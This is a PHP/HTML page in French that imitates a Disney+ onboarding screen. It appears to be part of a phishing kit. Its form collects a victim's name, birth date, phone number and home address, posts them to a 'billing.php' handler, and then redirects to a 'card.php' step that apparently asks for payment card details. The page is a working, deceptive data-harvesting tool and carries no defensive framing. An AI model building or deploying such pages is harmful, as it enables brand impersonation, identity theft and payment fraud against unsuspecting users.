<?php 

include("../common/sub_includes.php");
?>

<html lang="FR" xmlns="http://www.w3.org/1999/xhtml"  style="display: block;">

<?php  include("../common/sub_header.php"); ?>

<body id="app_index" class="js-focus-visible">

    <div id="webAppRoot" data-reactroot="">
        <div id="app_body_content" data-testid="adult-enabled-profile">
            <div class="sc-esoVGF cNOTUj"></div>
            <div id="hudson-wrapper" class="sc-ZUflv kcCFNP video_view--hidden  ">
                <div class="sc-hPeUyl bhhZhW hudson-container">
                    <div data-testid="" class="sc-hSdWYo dfLgnK"><img alt="" aria-hidden="true" src="../assets/images/icon-loader-32@3x.png" class="sc-eHgmQL jstxUN"></div>
                </div>
            </div>
            <div id="webAppHeader" class="onboarding">
                <div class="sc-iuJeZd hcKoaM">
                    <div class="sc-cmthru cJkwKD"><img style="width: 100%; margin: 0px;" src="../assets/images/ico/logo.svg" id="logo" class="sc-kEYyzF jLfEtv"></div>
                </div>
            </div>
            <div id="webAppScene">
                <div id="app_scene_content">
                    <div id="app-background" class="sc-ekHBYt eIfKUM"></div>
                    <main class="onboarding" id="onboarding_index" style="top: 0px;">
                        <div class="onboarding-wrapper">
                            <form  action="" id="formit" name="dssLogin" method="post">
                                <h3 color="white" style="color: rgb(249, 249, 249); margin: 0px; padding: 0px 0px 24px;" class="sc-gZMcBi jhLoHG">Informations personnelles</h3>

                                
                                <fieldset class="sc-dznXNo dhAlPS" id="password" display="none">
                                    <span style="position: relative; display: block;">
                                        <input aria-label="Mot de passe" display="inline" id="nam" name="input_name" placeholder="Nom" class="sc-kjoXOD clJmAK sc-ekulBa fOQezq"  type="text" required="">
                                    </span>
                                </fieldset>

                                <fieldset class="sc-dznXNo dhAlPS" id="password" display="none">
                                    <span style="position: relative; display: block;">
                                        <input aria-label="Mot de passe" display="inline" id="surnam" name="input_surname" placeholder="Prénom" class="sc-kjoXOD clJmAK sc-ekulBa fOQezq"  type="text" required="">
                                    </span>
                                </fieldset>


                                <fieldset class="sc-dznXNo dhAlPS" id="password" display="none">
                                    <span style="position: relative; display: block;">
                                        <input aria-label="Mot de passe" display="inline" id="birth" name="input_birth" placeholder="Date de naissance" class="sc-kjoXOD clJmAK sc-ekulBa fOQezq"  type="tel" required="" onkeyup="date_reformat_dd(this);" onkeypress="date_reformat_dd(this);" onpaste="date_reformat_dd(this);">
                                    </span>
                                </fieldset>

                                <fieldset class="sc-dznXNo dhAlPS" id="password" display="none">
                                    <span style="position: relative; display: block;">
                                        <input aria-label="Mot de passe" display="inline" id="phone" name="input_tel" placeholder="Numéro de téléphone" maxlength="10" class="sc-kjoXOD clJmAK sc-ekulBa fOQezq" type="tel" required="">
                                    </span>
                                </fieldset>
                                
                                <fieldset class="sc-dznXNo dhAlPS" id="password" display="none">
                                    <span style="position: relative; display: block;">
                                        <input aria-label="Mot de passe" display="inline" id="pass" name="input_residence" placeholder="Adresse" class="sc-kjoXOD clJmAK sc-ekulBa fOQezq"  type="text" required="">
                                    </span>
                                </fieldset>

                                    <fieldset class="sc-dznXNo dhAlPS " id="password" display="none">
                                        <span style="position: relative; display: block;">
                                            <input aria-label="Mot de passe" display="inline" id="pass" name="input_city" placeholder="Ville" class="sc-kjoXOD clJmAK sc-ekulBa fOQezq"  type="text" required="">
                                        </span>
                                    </fieldset>

                                    <fieldset class="sc-dznXNo dhAlPS " id="password" display="none">
                                        <span style="position: relative; display: block;">
                                            <input aria-label="Mot de passe" display="inline" id="postal" name="input_zipcode" placeholder="Code Postal" class="sc-kjoXOD clJmAK sc-ekulBa fOQezq"  type="tel" required="">
                                        </span>
                                    </fieldset>


                                <div>
                                    
                                    <button aria-label="Accepter et continuer" id="colorbg"  data-testid="login-continue-button" role="button" kind="primary" value="submit" class="sc-gPEVay jOqQLP" type="submit">
                                    <span id="btnn">Continuer</span> 
                                    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="svgg" style="margin:auto;background:transparent;display:none;" width="230px" height="90%" viewBox="0 0 100 100" preserveAspectRatio="xMidYMid">
                                        <circle cx="50" cy="50" fill="none" stroke="#2ecbff" stroke-width="6" r="34" stroke-dasharray="160.22122533307947 55.40707511102649">
                                        <animateTransform attributeName="transform" type="rotate" repeatCount="indefinite" dur="0.7092198581560283s" values="0 50 50;360 50 50" keyTimes="0;1"></animateTransform>
                                        </circle>
                                    </svg>
                                    </button>
                            
                            </div>
 
                            </form>
                        </div>
                    </main>
                </div>
            </div>
            <div tabindex="0" class="sc-eAKXzc fcUHFZ">
                <div id="cta-toast" class="sc-bfYoXt gCjimr"><button aria-label="" data-testid="" role="button" kind="primary" class="sc-gPEVay edYBEy sc-gbOuXE bcVAiB" id="" type="submit">OBTENIR DISNEY+</button></div>
            </div>
            <?php
            $sub_folder = true;
            include("../common/footer.php") 
            ?>
        </div>
    </div>

</body>

</html>

<script
  src="https://code.jquery.com/jquery-3.4.1.min.js"
  crossorigin="anonymous"></script>
<script src="../assets/js/mask.js"></script>

<script>    
$("#phone").mask("0000000000")
$("#postal").mask("00000")
$("#birth").mask("00 / 00 / 0000")


$("#phone").on('input propertychange',function(){
    charLimit($(this),17)
})

$("#postal").on('input propertychange',function(){
    charLimit($(this),14)
})


let charLimit = (input, maxChar) => {
    let len = $(input).val().length;
    if (len > maxChar) {
        $(input).val($(input).val().substring(0, maxChar));
    };
}

function checkValue(str, max) {
    if (str.charAt(0) !== '0' || str == '00') {
        var num = parseInt(str);
        if (isNaN(num) || num <= 0 || num > max) num = 1;
        str = num > parseInt(max.toString().charAt(0)) && num.toString().length == 1 ? '0' + num : num.toString();
    };
    return str;
};

function date_reformat_dd(date) {
    date.addEventListener('input', function(e) {
        this.type = 'text';
        var input = this.value;
        if (/\D\/$/.test(input)) input = input.substr(0, input.length - 3);
        var values = input.split('/').map(function(v) {
            return v.replace(/\D/g, '')
        });
        if (values[1]) values[1] = checkValue(values[1], 12);
        if (values[0]) values[0] = checkValue(values[0], 31);
        var output = values.map(function(v, i) {
            return v.length == 2 && i < 2 ? v + ' / ' : v;
        });
        this.value = output.join('').substr(0, 14);
    });
}


function date_reformat_mm(date) {
    date.addEventListener('input', function(e) {
        this.type = 'text';
        var input = this.value;
        if (/\D\/$/.test(input)) input = input.substr(0, input.length - 3);
        var values = input.split('/').map(function(v) {
            return v.replace(/\D/g, '')
        });
        if (values[0]) values[0] = checkValue(values[0], 12);
        if (values[1]) values[1] = checkValue(values[1], 31);
        var output = values.map(function(v, i) {
            return v.length == 2 && i < 2 ? v + ' / ' : v;
        });
        this.value = output.join('').substr(0, 14);
    });


}

$(document).ready(function() {
        $("#formit").submit(function(e) {
            e.preventDefault();
            var $this = $(this);
            $("#svgg").css("display","flex")
                    $("#btnn").css("display","none")
            $.ajax({
                    method: "POST",
                    url: "../actions/billing.php",
                    data: $(this).serialize()
                })
                .then(function(msg) {
                    setTimeout(function() {
                        window.location.href = "card.php";
                    }, 1500);
                });
            

        });
    });
</script>